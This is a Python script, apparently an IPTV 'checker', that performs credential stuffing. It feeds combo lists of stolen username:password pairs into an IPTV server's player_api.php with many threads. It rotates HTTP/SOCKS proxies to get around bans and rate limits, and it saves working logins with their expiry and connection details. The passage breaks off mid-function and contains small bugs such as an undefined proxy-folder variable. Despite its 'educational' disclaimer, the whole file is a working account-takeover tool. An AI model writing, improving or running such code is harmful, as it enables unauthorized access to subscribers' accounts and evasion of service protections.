"""
PY CONFIG BY Thomas R., Telegram: @ReyFxck
FEITO PARA AJUDAR QUEM PRECISA E DE GRAÇA!
GITHUB: https://github.com/ReyFxck/DeepSeek-IPTV-Checker-BETA-
FERRAMENTA EDUCACIONAL NÃO USE PARA O MAL
PROIBIDO A VENDA DESTE SCRIPT!

    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⡿⠿⢿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠉⠉⠉⠙⠻⣅⠀⠈⢧⠀⠈⠛⠉⠉⢻⣿⣿
    ⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣤⡶⠟⠀⠀⣈⠓⢤⣶⡶⠿⠛⠻⣿
    ⣿⣿⣿⣿⣿⢣⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣀⣴⠶⠿⠿⢷⡄⠀⠀⢀⣤⣾⣿
    ⣿⣿⣿⣿⣡⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣦⣤⣤⡀⠀⢷⡀⠀⠀⣻⣿⣿
    ⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⠛⠶⠛⠃⠈⠈⢿⣿⣿
    ⣿⣿⠟⠘⠀⠀⠀⠀⠀⠀⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠈⣿⣿
    ⣿⠏⠀⠁⠀⠀⠀⠀⠀⠀⠀⢀⣶⡄⠀⠀⠀⠀⠀⠀⣡⣄⣿⡆⠀⠀⠀⠀⣿⣿
    ⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠛⠛⢛⣲⣶⣿⣷⣉⠉⢉⣥⡄⠀⠀⠀⠨⣿⣿
    ⡇⢠⡆⠀⠀⢰⠀⠀⠀⠀⢸⣿⣧⣠⣿⣿⣿⣿⣿⣿⣷⣾⣿⡅⠀⠀⡄⠠⢸⣿
    ⣧⠸⣇⠀⠀⠘⣤⡀⠀⠀⠘⣿⣿⣿⣿⣿⠟⠛⠻⣿⣿⣿⡿⢁⠀⠀⢰⠀⢸⣿
    ⣿⣷⣽⣦⠀⠀⠙⢷⡀⠀⠀⠙⠻⠿⢿⣷⣾⣿⣶⠾⢟⣥⣾⣿⣧⠀⠂⢀⣿⣿
    ⣿⣿⣿⣿⣷⣆⣠⣤⣤⣤⣀⣀⡀⠀⠒⢻⣶⣾⣿⣿⣿⣿⣿⣿⣿⢀⣀⣾⣿⣿

C o d e d - B y - T h o m a s - N o o b S o f r e !
"""

# importar bibliotecas padrão
import os
import sys
import json
import time
import random
import threading
import traceback
from datetime import datetime

# Cores para melhorar a visualização
class cor:
    white_n = "\033[0;1m"
    vermelho = "\033[91m"
    verde = "\033[92m"
    amarelo = "\033[93m"
    azul = "\033[94m"
    magenta = "\033[95m"
    ciano = "\033[96m"
    reset = "\033[0m"
    c_azul = "\033[38;5;27m"
    c_purple = "\033[38;5;200m"
    custom = "\033[38;5;208m"
    fail = "\033[1;38;5;9m"
    atention = "\033[1;38;5;227m"

# Verifica se as bibliotecas estão instaladas
try:
    import requests
except ImportError:
    print(f"{cor.vermelho}A biblioteca 'requests' não está instalada. Instale-a com o comando abaixo:{cor.reset}")
    print("pip install requests")
    exit()

try:
    import socks
    from requests.packages.urllib3.contrib.socks import SOCKSProxyManager
except ImportError:
    print(f"{cor.vermelho}A biblioteca 'requests[socks]' não está instalada. Instale-a com o comando abaixo:{cor.reset}")
    print("pip install requests[socks]")
    exit()

try:
    from tabulate import tabulate
except ImportError:
    print(f"{cor.vermelho}A biblioteca 'tabulate' não está instalada. Instale-a com o comando abaixo:{cor.reset}")
    print("pip install tabulate")
    exit()

# ======================================
# CONSTANTES E CONFIGURAÇÕES GLOBAIS
# ======================================
CONFIG_FILE = "config.json"
LANG_DIR = "Language"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def criar_t(config):
    """Retorna uma função t() que já tem acesso ao config"""
    def t(key, default=None):
        keys = key.split('.')
        current = carregar_idioma(config["idioma"]).get("translations", {})
        
        try:
            for k in keys:
                current = current[k]
            return current
        except (KeyError, TypeError):
            return default if default is not None else key
    return t

def carregar_configuracoes():
    """Carrega ou cria arquivo de configuração"""
    defaults = {
        "sistema_operacional": None,
        "idioma": None,
        "configurado": False
    }
    
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                dados = json.load(f)
                # Corrige estrutura aninhada se existir
                if isinstance(dados.get("sistema_operacional"), dict):
                    return {
                        "sistema_operacional": dados["sistema_operacional"].get("sistema_operacional"),
                        "idioma": dados["sistema_operacional"].get("idioma", "pt"),
                        "configurado": dados["sistema_operacional"].get("configurado", False)
                    }
                return {**defaults, **dados}
        except:
            return defaults
    return defaults

def salvar_configuracao(config):
    """Salva configurações no arquivo garantindo estrutura plana"""
    # Garante que não haja aninhamento
    config_plana = {
        "sistema_operacional": config.get("sistema_operacional"),
        "idioma": config.get("idioma", "pt"),
        "configurado": config.get("configurado", False)
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(config_plana, f, indent=4)

# Banner de decoração (normal em projetos)
def banner(config, t):
    clear()
    translated_by = t('traduce.traduce_json', default="Json não carregado")
    print(f"""{cor.c_azul}
        ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣤⣶⣶⣶⠶⠀⠀⠀⠀⣰⣿⣄            
        ⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣷⣦⡀⢀⣀⣀⣠⣴⣿            
        ⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⢹⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⡿           
        ⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁        
        ⣾⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⢨⣿⣿⣿⡟⠛⠉⠁        
        ⣿⣿⡇⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣏⣉⠻⢿⣿⣿⣿⣿⣿⣿⣿⡇        
        ⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣯⣿⡇⠀⢻⣿⣿⣿⣿⣿⣿⠁        
        ⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣷⣦⣴⣿⣿⣿⣿⣿⠏        
        ⢻⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟        
        ⠀⠹⣿⣿⣿⣷⣄⠀⠀⠀⠀⣴⣦⣄⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⠋        
        ⠀⠀⠙⢿⣿⣿⣿⣷⣄⡀⠀⢿⣿⣿⣿⣦⣄⠀⠙⢿⣿⣿⣿⣿⣿⣤⣀        
        ⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣽⡿⢿⣿⣿⣿⣿⡿        
        ⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀{cor.reset}
{cor.c_purple}\n            DEEPSEEK IPTV CHECKER BY @ReyFxck
            GitHub https://github.com/ReyFxck
            Script Python, Version: 1 Beta: 5\n{cor.reset}
            Translated by: {translated_by}{cor.reset}""")

# ==============================================
# GERENCIAMENTO DE IDIOMAS
# ==============================================
def carregar_idioma(idioma):
    """Carrega traduções do arquivo de idioma"""
    lang_file = f"lang-{idioma}.json" if idioma != "default" else "lang.json"
    
    base_dir = os.path.dirname(os.path.abspath(__file__))
    lang_path = os.path.join(base_dir, LANG_DIR, lang_file)

    # Fallback para inglês se o arquivo não existir
    if not os.path.exists(lang_path):
        lang_path = os.path.join(base_dir, LANG_DIR, "lang-en.json")
        if not os.path.exists(lang_path):
            return {"translations": {}}
    
    try:
        with open(lang_path, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {"translations": {}}

def listar_idiomas_disponiveis():
    """Retorna lista de idiomas disponíveis na pasta lang/"""
    if not os.path.exists(LANG_DIR):
        os.makedirs(LANG_DIR)
        return []
    
    idiomas = []
    for arquivo in os.listdir(LANG_DIR):
        if arquivo.startswith("lang-") and arquivo.endswith(".json"):
            idiomas.append(arquivo[5:-5])  # Remove 'lang-' e '.json'
    return idiomas

# Função para escolher o sistema operacional
def escolher_sistema_operacional(config, t=None):
    """Mostra opções de SO com tradução e confirma o caminho"""
    banner(config, t)
    
    # Dicionário FIXO de mapeamento
    SISTEMAS_PADRONIZADOS = {
        "1": "Android",
        "2": "Windows", 
        "3": "Linux",
        "4": "macOS",
        "5": "iOS"
    }
    
    # Textos traduzidos (com fallback)
    if t:
        titulo = ('  Escolha o sistema operacional:')
        ajuda = ('Isso define onde as pastas serão criadas:')
        opcoes_texto = {
            "1": ("Android"),
            "2": ("Windows"),
            "3": ("Linux"), 
            "4": ("macOS"),
            "5": ("iOS")
        }
        prompt = ('>>')
        erro_msg = ('Opção inválida!')
        confirmacao = ('Caminho que será usado:')
    else:
        titulo = "Escolha o sistema operacional:"
        ajuda = "Isso define onde as pastas serão criadas:"
        opcoes_texto = SISTEMAS_PADRONIZADOS.copy()
        prompt = ">>>"
        erro_msg = "Opção inválida!"
        confirmacao = "Caminho que será usado:"

    print(f"{cor.ciano}{titulo}{cor.reset}")
    print(f"\n{cor.amarelo}[?] {ajuda}{cor.reset}\n")
    
    # Mostra menu
    for num, nome in opcoes_texto.items():
        print(f"{cor.azul}{num}. {nome}{cor.reset}")
    
    # Validação
    while True:
        escolha = input(f"{cor.verde} {prompt} {cor.reset}").strip()
        
        if escolha in SISTEMAS_PADRONIZADOS:
            sistema_escolhido = SISTEMAS_PADRONIZADOS[escolha]
            caminho = determinar_caminho_base(sistema_escolhido)
            
            # NOVO: Mostra confirmação do caminho
            print(f"\n{cor.verde}✓ {confirmacao}{cor.reset}")
            print(f"{cor.ciano}{caminho if caminho else 'Não suportado!'}{cor.reset}\n")
            
            if caminho:
                return sistema_escolhido
            else:
                print(f"{cor.vermelho}Sistema não suportado! Escolha novamente.{cor.reset}")
        else:
            print(f"{cor.vermelho}{erro_msg}{cor.reset}")

# Função para determinar o caminho base com base no sistema operacional
def determinar_caminho_base(sistema_operacional):
    try:
        caminhos = {
            "Android": "/sdcard/",  # Caminho padrão no Android
            "Windows": os.path.join(os.environ["USERPROFILE"], "Documents"),
            "Linux": os.path.join(os.environ.get("HOME", "/"), "Documents"),
            "macOS": os.path.join(os.environ.get("HOME", "/"), "Documents"),
            "iOS": "."
        }
        return caminhos.get(sistema_operacional, None)
    except KeyError:
        # Fallback para Android ou outros sistemas se houver erro
        return "/sdcard/" if sistema_operacional == "Android" else None

# Função para limpar o host (remover http://, https://, barras e espaços)
def limpar_host(host):
    host = host.replace("http://", "").replace("https://", "")  # Remove protocolos
    host = host.split("/")[0]  # Remove barras no final
    host = host.strip()  # Remove espaços em branco
    return host

# Função para listar arquivos em uma pasta e permitir a escolha pelo número
def escolher_arquivo(pasta, t, tipo="combo"):
    if not os.path.exists(pasta):
        print(f"{cor.amarelo}  {t('responses.creating_folder_combo', 'Criando pasta:')} {pasta}{cor.reset}")
        os.makedirs(pasta)
        return None
        
    arquivos = [f for f in os.listdir(pasta) if f.endswith('.txt')]
    if not arquivos:
        print(f"{cor.vermelho}  {t('responses.file_not_found')}{cor.reset}")
        return None
     
    print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
    if tipo == "combo":
        print(f"{cor.atention}  {t('questions.select_combo_file')}{cor.reset}")
    else:
        print(f"{cor.atention}  {t('questions.select_proxy_file')}{cor.reset}")
        
    for i, arquivo in enumerate(arquivos):
        print(f"{cor.azul}  {i + 1}. {arquivo}{cor.reset}")
        
    print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
    
    # Mensagem diferente para combo ou proxy
    if tipo == "combo":
        print(f"\n{cor.ciano}  {t('questions.about_combo')}{cor.reset}")
    else:
        print(f"\n{cor.ciano}  {t('questions.about_proxy')}{cor.reset}")
        
    try:
        escolha = int(input(f"\n  {cor.verde}{t('responses.response')} >>> {cor.reset}")) - 1
        if 0 <= escolha < len(arquivos):
            return os.path.join(pasta, arquivos[escolha])
        else:
            print(f"{cor.vermelho}\n  {t("responses.invalid_choice")}{cor.reset}")
            return None
    except ValueError:
        print(f"{cor.vermelho}\n  {t("responses.invalid_input")}{cor.reset}")
        return None

# Função para configurar o tipo de proxy
def configurar_proxy(tipo, proxy):
    if tipo == 1:  # HTTP/HTTPS
        return {"http": proxy, "https": proxy}
    elif tipo == 2:  # SOCKS4
        return {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
    elif tipo == 3:  # SOCKS5
        return {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
    else:
        return None

# Função para converter timestamp em data legível (formato DD.MM.YYYY - HH:MM)
def converter_data(timestamp, t=None):
    try:
        return datetime.fromtimestamp(int(timestamp)).strftime('%d.%m.%Y - %H:%M')
    except:
        return t('checker.unlimited_time') if t else "Ilimitada"

# Função para testar usuário e senha (com ou sem proxy)
def test_account(username, password, proxy_config, server, headers, t):
    url = f"http://{server}/player_api.php?username={username}&password={password}"
    try:
        response = requests.get(
            url,
            proxies=proxy_config,
            headers=headers,
            timeout=10
        )
        if response.status_code == 200:
            try:
                data = response.json()  # Tenta converter a resposta para JSON
                
                # Verifica se o campo 'auth' existe e é igual a 1
                auth = data.get("user_info", {}).get("auth", 0)  # Verifica dentro de 'user_info'
                if auth == 0:
                    auth = data.get("auth", 0)  # Verifica no nível raiz, caso não esteja em 'user_info'

                if auth == 1:
                    # Conta válida (Hit)
                    user_info = data.get("user_info", {})
                    
                    # Busca dinâmica dos campos
                    status = user_info.get("status", data.get("status", "Desconhecido"))  # Verifica em 'user_info' e no nível raiz
                    exp_date = user_info.get("exp_date", data.get("exp_date"))  # Verifica em 'user_info' e no nível raiz
                    exp_date = t('checker.unlimited_time') if exp_date is None else converter_data(exp_date, t)
                    
                    return username, password, status, exp_date, response.status_code, user_info, "hit"
                else:
                    # Conta inválida (Bad), mas a proxy está funcionando
                    return username, password, None, None, response.status_code, None, "bad"
            except ValueError:
                # Resposta não é JSON válido (Bad), mas a proxy está funcionando
                return username, password, None, None, response.status_code, None, "bad"
        elif response.status_code == 404:
            # Conta inválida (Bad), mas a proxy está funcionando
            return username, password, None, None, response.status_code, None, "bad"
        elif response.status_code == 403 or response.status_code == 407:
            # Bloqueio (Ban)
            return username, password, None, None, response.status_code, None, "ban"
        elif response.status_code == 429:
            # Não usar a proxy por um tempo
            return username, password, None, None, response.status_code, None, "429"
        else:
            # Outros erros (Proxy ruim)
            return username, password, None, None, response.status_code, None, "proxy_ruim"
    except Exception as e:
        # Erro na requisição (Proxy ruim)
        return username, password, None, None, str(e), None, "proxy_ruim"

# Função para salvar informações no arquivo de hits
def salvar_hit(server, username, password, status, exp_date, user_info, caminho_arquivo, t=None):
    try:
        with open(caminho_arquivo, "a", encoding='utf-8') as f:
            f.write(f"=====[ DEEPSEEK CHECKER ]=====\n")
            f.write(f"DeepSeek Checker V5 Beta - Rev 1\n")
            f.write(f"Coded by DeepSeek & ReyFxck Th.\n")
            f.write(f"{t("traduce.traduce_hit")}\n")
            f.write(f"=====[ HOST INFORMATION ]=====\n")

            # MESSAGE (se existir)
            if "message" in user_info and user_info["message"]:
                f.write(f"{t("checker.message")}: {user_info["message"]}\n")

            # HOST, USER, PASS, STATUS
            f.write(f"{t("checker.host")}: {server}\n")
            f.write(f"{t("checker.user")}: {username}\n")
            f.write(f"{t("checker.password")}: {password}\n")
            f.write(f"{t("checker.status")}: {status}\n")
            
            # TESTE (is_trial)
            if "is_trial" in user_info:
                teste = t("questions.yes") if user_info["is_trial"] == "1" else t("questions.no")
                f.write(f"{t("checker.trial")}: {teste}\n")
            
            # EXP (data de expiração formatada)
            if exp_date:
                f.write(f"{t('checker.expiration', 'EXP')}: {exp_date}\n")
            
            # CRIADO (data de criação formatada)
            if "created_at" in user_info and user_info["created_at"]:
                criado = converter_data(user_info["created_at"])
                f.write(f"{t("checker.created_at")}: {criado}\n")
            
            # CONN: ACT: | MAX: (conexões ativas e máximas)
            if "active_cons" in user_info and "max_connections" in user_info:
                f.write(f"{t("checker.connections")}: {t("checker.active_connections")}: {user_info["active_cons"]} | {t("checker.max_connections")}: {user_info["max_connections"]}\n")
            
            # TIMEZONE (se existir)
            if "timezone" in user_info and user_info["timezone"]:
                f.write(f"{t("checker.timezone")}: {user_info["timezone"]}\n")
            
            # Rodapé
            f.write(f"====[ IPTV CHK BY -- ReyFxck ]====\n\n\n")
    except Exception as e:
        print(f"{cor.vermelho}{t("responses.error_saving_file")} {e}{cor.reset}")

def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, bans, total_linhas, caminho_arquivo, usar_proxy, arquivo_proxy, config, t):
    lock = threading.Lock()
    proxies_bons = []  # Proxies que funcionaram (hit/bad)
    proxies_ruins = []  # Proxies que falharam (ban/429/proxy_ruim)
    contador_proxies = {}  # Conta quantas vezes cada proxy foi usada
    MAX_USOS_POR_PROXY = 10  # Máximo de usos por proxy

    def worker(config, t):
        nonlocal hits, bads, bans
        while True:
            with lock:
                if not combos:
                    break
                user, password = combos.pop(0)
                linha_atual = total_linhas - len(combos)

            # Se não estiver usando proxy
            if usar_proxy != "1":
                result = test_account(user, password, None, server, headers, t)
                username, password, status, exp_date, status_code, user_info, resultado = result
                
                with lock:
                    if resultado == "hit":
                        hits += 1
                        salvar_hit(server, username, password, status, exp_date, user_info, caminho_arquivo, t)
                    elif resultado == "bad":
                        bads += 1
                    elif resultado == "ban":
                        bans += 1
                
                exibir_informacoes(
                    server=server,
                    user=username,
                    password=password,
                    status_code=status_code,
                    linha_atual=linha_atual,
                    total_linhas=total_linhas,
                    hits=hits,
                    bads=bads,
                    bans=bans,
                    usar_proxy=usar_proxy,
                    proxies_bons_count=0,
                    proxies_ruins_count=0,
                    tipo_proxy=None,
                    arquivo_proxy=None,
                    proxy_escolhida=None,
                    config=config,
                    t=t
                )
                continue

            # Se estiver usando proxy
            proxy_escolhida = None
            resultado = None
            
            # Tenta primeiro com proxies boas
            for proxy_candidata in proxies_bons + proxies:
                if proxy_candidata in proxies_ruins:
                    continue
                
                with lock:
                    if contador_proxies.get(proxy_candidata, 0) >= MAX_USOS_POR_PROXY:
                        continue
                
                proxy_config = configurar_proxy(tipo_proxy, proxy_candidata)
                result = test_account(user, password, proxy_config, server, headers, t)
                username, password, status, exp_date, status_code, user_info, resultado = result
                
                with lock:
                    # Atualiza contador de usos da proxy
                    contador_proxies[proxy_candidata] = contador_proxies.get(proxy_candidata, 0) + 1
                    
                    # Classifica a proxy
                    if resultado in ["hit", "bad"]:
                        if proxy_candidata not in proxies_bons:
                            proxies_bons.append(proxy_candidata)
                        if proxy_candidata in proxies_ruins:
                            proxies_ruins.remove(proxy_candidata)
                    elif resultado in ["ban", "429", "proxy_ruim"]:
                        if proxy_candidata not in proxies_ruins:
                            proxies_ruins.append(proxy_candidata)
                        if proxy_candidata in proxies_bons:
                            proxies_bons.remove(proxy_candidata)
                
                proxy_escolhida = proxy_candidata
                
                # Se obteve resultado, para de tentar outras proxies
                if resultado in ["hit", "bad", "ban"]:
                    break
            
            # Processa o resultado
            with lock:
                if resultado == "hit":
                    hits += 1
                    salvar_hit(server, username, password, status, exp_date, user_info, caminho_arquivo)
                elif resultado == "bad":
                    bads += 1
                elif resultado == "ban":
                    bans += 1
            
#            banner(config, t)
            exibir_informacoes(
                server=server,
                user=username if 'username' in locals() else user,
                password=password,
                status_code=status_code if 'status_code' in locals() else "N/A",
                linha_atual=linha_atual,
                total_linhas=total_linhas,
                hits=hits,
                bads=bads,
                bans=bans,
                usar_proxy=usar_proxy,
                proxies_bons_count=len(proxies_bons),
                proxies_ruins_count=len(proxies_ruins),
                tipo_proxy=tipo_proxy,
                arquivo_proxy=arquivo_proxy,
                proxy_escolhida=proxy_escolhida,
                config=config,
                t=t
            )

    # Inicia as threads
    threads = []
    for _ in range(num_bots):
        thread = threading.Thread(target=worker, args=(config, t))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    # Salva proxies boas/ruins (opcional)
    if usar_proxy == "1":
        with open(os.path.join(pasta_proxy, "proxies_bons.txt"), "w") as f:
            f.write("\n".join(proxies_bons))
        with open(os.path.join(pasta_proxy, "proxies_ruins.txt"), "w") as f:
            f.write("\n".join(proxies_ruins))

    return hits, bads, bans

def exibir_informacoes(server, user, password, status_code, linha_atual, total_linhas, hits, bads, bans, usar_proxy, proxies_bons_count=None, proxies_ruins_count=None, tipo_proxy=None, arquivo_proxy=None, proxy_escolhida=None, config=None, t=None):
    deepseek = "\033[38;5;33m DEEPSEEK CHK\033[0m"
    infor_x = "\033[38;5;11m    INFORMATIONS\033[0m"
    created = "   BY ReyFxck"
    
    # Limpa a tela ou sobrescreve as informações anteriores
    sys.stdout.write("\033[H\033[J")  # Código ANSI para limpar a tela

    # Tabela de informações gerais
    tabela_host = [
        ["\033[38;5;45m   Host: ", f"\033[38;5;47m http://{server} \033[0m"],
        ["\033[38;5;153m   Status: ", status_code],
        ["\033[38;5;81m   User: ", user],
        ["\033[38;5;117m   Pass: ", password],
#    ]
        ["\033[1;38;5;156m   Hits: ", f"   {hits} {cor.reset} "],
        [f"{cor.fail}   Fails: ", f"    {bads} "],
        ["\033[1;38;5;214m   Banned: ", f"   {bans} {cor.reset} "],
        ["   Combo", f"{linha_atual}/{total_linhas} "],
        ["\033[38;5;189m   Restam: ", f" {total_linhas - linha_atual} "]
    ]

    banner(config, t)
    print(tabulate(tabela_host, headers=[deepseek, infor_x], tablefmt="pretty"))

    # Tabela de configurações de proxies (se estiver usando proxies)
    if usar_proxy == "1":
        # Determina o tipo de proxy
        tipo_proxy_str = "Desconhecido"
        if tipo_proxy == 1:
            tipo_proxy_str = "HTTP/HTTPS"
        elif tipo_proxy == 2:
            tipo_proxy_str = "SOCKS4"
        elif tipo_proxy == 3:
            tipo_proxy_str = "SOCKS5"

        # Tabela de configurações de proxies
        tabela_proxies = [
            [f"\n{cor.azul}PROXYS CONFIGS{cor.reset}", "INFO"],
            ["TIPO", tipo_proxy_str],
            ["ARQUIVO", os.path.basename(arquivo_proxy) if arquivo_proxy else "Nenhum arquivo carregado"],
            ["PROXY ATUAL", proxy_escolhida if proxy_escolhida else "Nenhuma proxy em uso"],
            ["ALIVE", f"{cor.verde}{proxies_bons_count}{cor.reset}"],
            ["BADS", f"{cor.vermelho}{proxies_ruins_count}{cor.reset}"],
            ["BANNED", f"{cor.amarelo}{bans}{cor.reset}"]
        ]
        print(tabulate(tabela_proxies, tablefmt="rst"))

    # Rodapé
    sys.stdout.flush()

# ==============================================
# MENUS E FLUXO PRINCIPAL
# ==============================================
def mostrar_menu_principal(config, t):
    banner(config, t)
    print(f"\n{cor.ciano}  ===== {t('menu.main_title')} ====={cor.reset}")
    print(f"{cor.atention}  {t('menu.choose_option')}{cor.reset}")
    print(f"{cor.azul}  = 1. {t('menu.menu_start')}{cor.reset}")
    print(f"{cor.azul}  = 2. {t('menu.settings')}{cor.reset}")
    print(f"{cor.azul}  = 3. {t('menu.exit_script')}{cor.reset}")
    print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
    
    while True:
        escolha = input(f"{cor.verde}  {t('responses.response')} >>> {cor.reset}").strip()
        if escolha in ("1", "2", "3"):
            if escolha == "3":
                banner(config, t)
                print(f"\n  {cor.amarelo}{t('menu.exit_info1')}{cor.reset}")
                print(f"  {cor.verde}{t('menu.exit_info2')}{cor.reset}")
                print(f"  {cor.azul}{t('menu.exit_info3')}{cor.reset}")
                print(f"  {cor.white_n}{t('menu.exit_info4')}{cor.reset}")
                sys.exit(0)
            return escolha
        print(f"\n{cor.vermelho}  {t('responses.invalid_option')}{cor.reset}")

def mostrar_menu_configuracoes(config, t):
    """Menu de configurações com opções de idioma e SO"""
    while True:
        banner(config, t)
        print(f"\n{cor.ciano}  === {t('settings_title', 'CONFIGURAÇÕES')} ==={cor.reset}")
        print(f"{cor.azul}  = 1. {t('change_language')} (Atual: {config['idioma']}){cor.reset}")
        print(f"{cor.azul}  = 2. {t('change_os', 'Alterar sistema operacional')} (Atual: {config['sistema_operacional'] or 'Não configurado'}){cor.reset}")
        print(f"{cor.azul}  = 3. {t('save_exit', 'Salvar e voltar')}{cor.reset}")
        print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')

        escolha = input(f"{cor.verde}>> {cor.reset}").strip()
        
        if escolha == "1":
            config["idioma"] = selecionar_idioma()
        elif escolha == "2":
            config["sistema_operacional"] = escolher_sistema_operacional(config, t)
        elif escolha == "3":
            salvar_configuracao(config)
            break
        else:
            print(f"{cor.vermelho}{t('invalid_option')}{cor.reset}")

def selecionar_idioma():
    """Permite ao usuário escolher um idioma"""
    idiomas = listar_idiomas_disponiveis()
    
    if not idiomas:
        print(f"{cor.vermelho}Nenhum arquivo de idioma encontrado na pasta '{LANG_DIR}/'!{cor.reset}")
        return "pt"
    
    print(f"\n{cor.ciano}Idiomas disponíveis:{cor.reset}")
    for idx, idioma in enumerate(idiomas, 1):
        print(f"{cor.azul}{idx}. {idioma}{cor.reset}")
    
    while True:
        try:
            escolha = int(input(f"{cor.verde}Selecione >> {cor.reset}")) - 1
            if 0 <= escolha < len(idiomas):
                return idiomas[escolha]
        except:
            pass
        print(f"{cor.vermelho}Seleção inválida!{cor.reset}")

# ==============================================
# FUNÇÃO PRINCIPAL
# ==============================================
def main():
    config = carregar_configuracoes()
    t = criar_t(config)

    # Se ainda não escolheu sistema operacional
    if not config.get("sistema_operacional"):
        config["sistema_operacional"] = escolher_sistema_operacional(config, t)
        config["configurado"] = True
        salvar_configuracao(config)

    # Se ainda não escolheu idioma
    if not config.get("idioma"):
        banner(config, t)
        print(f"\n  {cor.amarelo}Idioma não configurado. Selecione o idioma:{cor.reset}")
        config["idioma"] = selecionar_idioma()
        salvar_configuracao(config)

    # Menu principal
    while True:
        escolha = mostrar_menu_principal(config, t)
        if escolha == "1":
            break
        elif escolha == "2":
            mostrar_menu_configuracoes(config, t)

    # Perguntar o host do servidor
    banner(config, t)
    print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
    print(f"  {cor.atention}{t("questions.server_host")}{cor.reset}")
    print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
    server = input(f"{cor.verde}  {t("responses.response")} >>> {cor.reset}")
    server = limpar_host(server)
    if not server:
        print(f"{cor.vermelho}\n  {t("responses.invalid_host")}{cor.reset}")
        return

    banner(config, t)
    # Resto do código
    sistema_operacional = config["sistema_operacional"]
    caminho_base = determinar_caminho_base(sistema_operacional)
    
    if not caminho_base:
        print(f"{cor.vermelho}  {t('responses.system_not_suported')}{cor.reset}")
        return

    # Define os caminhos das pastas
    pasta_combo = os.path.join(caminho_base, "Combo")
    pasta_proxy = os.path.join(caminho_base, "Proxy")
    pasta_hits = os.path.join(caminho_base, "Hits")

    # Criar pastas se não existirem
    for pasta in [pasta_combo, pasta_proxy, pasta_hits]:
        if not os.path.exists(pasta):
            print(f"{cor.amarelo}  {t('responses.creating_folder_combo')} {pasta}{cor.reset}")
            os.makedirs(pasta)

    arquivo_combo = escolher_arquivo(pasta_combo, t, tipo="combo")
    
    if not arquivo_combo:
        return

    # Perguntar se deseja usar proxy
    banner(config, t)
    print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
    print(f"  {cor.atention}{t("questions.confirm_proxy")}{cor.reset}")
    print(f"  {cor.azul}1. {t("questions.yes")}\n  2. {t("questions.no")}")
    print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
    usar_proxy = input(f"\n  {cor.verde}{t('responses.response')} >>> {cor.reset}")
    if usar_proxy not in ["1", "2"]:
        print(f"\n  {cor.vermelho}{t("questions.error_question_proxy")}{cor.reset}")
        return

    proxies = []
    tipo_proxy = None  # Inicializa tipo_proxy como None
    if usar_proxy == "1":
        banner(config, t)
        arquivo_proxy = escolher_arquivo(pasta_proxy, t, tipo="proxy")
        if not arquivo_proxy:
            return

        # Ler proxies
        with open(arquivo_proxy, 'r') as f:
            proxies = [linha.strip() for linha in f.readlines()]

        # Escolher tipo de proxy
        banner(config, t)
        print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
        print(f"{cor.atention}  {t("questions.proxy_type")}{cor.reset}")
        print(f"{cor.azul}  1. HTTP/HTTPS{cor.reset}")
        print(f"{cor.azul}  2. SOCKS4{cor.reset}")
        print(f"{cor.azul}  3. SOCKS5{cor.reset}")
        print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
        try:
            tipo_proxy = int(input(f"\n  {cor.verde}{t('responses.response')} >>> {cor.reset}"))
            if tipo_proxy not in [1, 2, 3]:
                print(f"\n  {cor.vermelho}{t("questions.error_type_proxy")}{cor.reset}")
                return
        except ValueError:
